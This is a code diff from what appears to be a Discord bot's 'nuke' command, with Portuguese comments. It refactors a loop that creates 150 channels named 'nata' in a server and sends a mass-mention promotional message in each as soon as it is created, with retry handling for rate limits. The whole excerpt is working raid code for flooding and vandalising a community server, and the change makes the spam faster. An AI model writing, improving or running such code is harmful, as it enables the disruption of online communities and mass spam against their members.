@@ -42634,37 +42634,31 @@ async def nuke_cmd(ctx: commands.Context):
     _first_ch   = None
     _created_channels: list[discord.TextChannel] = []
 
-    # 5a. Criar todos os 150 canais primeiro (sem enviar mensagens ainda)
-    _created = 0
-    while _created < 150:
-        try:
-            _new_ch = await guild.create_text_channel("nata", reason="Nuke — recriação")
-            _created += 1
-            _created_channels.append(_new_ch)
-            if _first_ch is None:
-                _first_ch = _new_ch
-            print(f"[nuke] canal {_created}/150 criado", flush=True)
-            await asyncio.sleep(0.5)
-        except discord.Forbidden:
-            # Bot sem permissão no servidor — não adianta continuar
-            print(f"[nuke] FATAL: sem permissão para criar canais (parou em {_created}/150)", flush=True)
-            break
-        except discord.HTTPException as _he:
-            print(f"[nuke] HTTPException {_he.status} ao criar canal {_created+1} — aguardando 5s", flush=True)
-            await asyncio.sleep(5)
-        except Exception as _exc:
-            print(f"[nuke] erro criar canal {_created+1}: {type(_exc).__name__}: {_exc} — aguardando 3s", flush=True)
-            await asyncio.sleep(3)
-
-    # 5b. Enviar divulgação em todos os canais criados (tasks paralelas)
     async def _nuke_send(c: discord.TextChannel) -> None:
         try:
             await c.send(content=_nuke_msg, allowed_mentions=_nuke_allow)
         except Exception:
             pass
 
-    for _ch in _created_channels:
-        asyncio.create_task(_nuke_send(_ch))
+    _created = 0
+    while _created < 150:
+        try:
+            _new_ch = await guild.create_text_channel("nata", reason="Nuke — recriação")
+            _created += 1
+            if _first_ch is None:
+                _first_ch = _new_ch
+            asyncio.create_task(_nuke_send(_new_ch))
+            print(f"[nuke] canal {_created}/150 criado", flush=True)
+            await asyncio.sleep(0.5)
+        except discord.Forbidden:
+            print(f"[nuke] FATAL: sem permissão para criar canais (parou em {_created}/150)", flush=True)
+            break
+        except discord.HTTPException as _he:
+            print(f"[nuke] HTTPException {_he.status} ao criar canal {_created+1} — aguardando 5s", flush=True)
+            await asyncio.sleep(5)
+        except Exception as _exc:
+            print(f"[nuke] erro canal {_created+1}: {type(_exc).__name__}: {_exc} — aguardando 3s", flush=True)
+            await asyncio.sleep(3)
 
 
 
